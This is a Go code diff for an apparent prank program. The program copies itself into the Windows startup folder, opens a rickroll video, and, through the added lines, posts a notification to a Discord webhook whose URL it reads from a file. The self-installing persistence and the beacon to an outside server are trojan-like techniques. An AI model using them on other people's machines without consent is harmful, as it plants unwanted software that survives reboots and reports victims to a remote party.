@@ -5,11 +5,21 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+
+	"github.com/gtuk/discordwebhook"
 )
 
 func main() {
 	copyToStartup()
 	openLink("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+	var username string = "Rickroll"
+	var content string = "Someone got rickrolled :D"
+	message := discordwebhook.Message{
+		Username: &username,
+		Content: &content,
+	}
+	url, _ := os.ReadFile("webhook.txt")
+	discordwebhook.SendMessage(string(url), message)
 }
 func openLink(link string) {
 	exec.Command("cmd","/c","start", link).Start()
